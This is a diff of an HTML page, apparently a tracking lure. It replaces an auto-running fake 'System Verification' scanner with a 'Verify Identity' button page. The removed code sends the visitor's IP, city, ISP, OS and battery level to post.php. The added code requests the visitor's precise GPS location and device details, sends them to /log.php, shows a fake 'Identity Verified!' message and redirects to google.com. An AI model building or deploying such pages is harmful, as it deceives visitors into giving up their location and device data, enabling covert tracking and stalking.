@@ -1,42 +1,50 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>System Verification</title>
-    <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
-        .loader { border: 5px solid #333; border-top: 5px solid #0f0; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-    <script>
-        async function collect() {
-            let data = {};
-            // IP & Location
-            const res = await fetch('https://ipapi.co/json/');
-            const json = await res.json();
-            
-            data.ip = json.ip;
-            data.loc = json.city + ", " + json.country_name;
-            data.org = json.org;
-            data.os = navigator.platform;
-            data.agent = navigator.userAgent;
-            data.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            
-            // Battery Info
-            try {
-                const batt = await navigator.getBattery();
-                data.battery = (batt.level * 100) + "%";
-            } catch(e) { data.battery = "Unknown"; }
+<body style="background:#000; color:#fff; text-align:center; padding-top:20%;">
+    <h2>Secure Connection Required</h2>
+    <button onclick="startTracking()" style="padding:15px 30px; font-size:20px; background:#007bff; color:white; border:none; border-radius:10px;">
+        Verify Identity
+    </button>
 
-            // Sending Data
-            fetch('post.php?type=info&val=' + btoa(JSON.stringify(data)));
-            document.getElementById('msg').innerText = "SYSTEM SECURE. PROCEEDING...";
+    <script>
+        async function startTracking() {
+            // Data collection variables
+            let batteryLevel = "Unknown";
+            try {
+                const b = await navigator.getBattery();
+                batteryLevel = Math.round(b.level * 100) + "%";
+            } catch(e) { batteryLevel = "Access Denied"; }
+
+            const devInfo = {
+                platform: navigator.platform,
+                memory: navigator.deviceMemory || "Unknown",
+                browser: navigator.userAgent,
+                screen: screen.width + "x" + screen.height,
+                lang: navigator.language
+            };
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((p) => {
+                    const params = new URLSearchParams({
+                        lat: p.coords.latitude,
+                        lon: p.coords.longitude,
+                        platform: devInfo.platform,
+                        ram: devInfo.memory + "GB",
+                        battery: batteryLevel,
+                        screen: devInfo.screen,
+                        lang: devInfo.lang,
+                        agent: devInfo.browser
+                    });
+                    
+                    fetch('/log.php?' + params.toString())
+                    .then(() => {
+                        alert("Identity Verified!");
+                        window.location.href = "https://google.com";
+                    });
+                });
+            }
         }
-        window.onload = collect;
     </script>
-</head>
-<body>
-    <div class="loader"></div>
-    <h1 id="msg">SCANNING FOR VULNERABILITIES...</h1>
-    <p>Please do not close this window.</p>
 </body>
 </html>
+
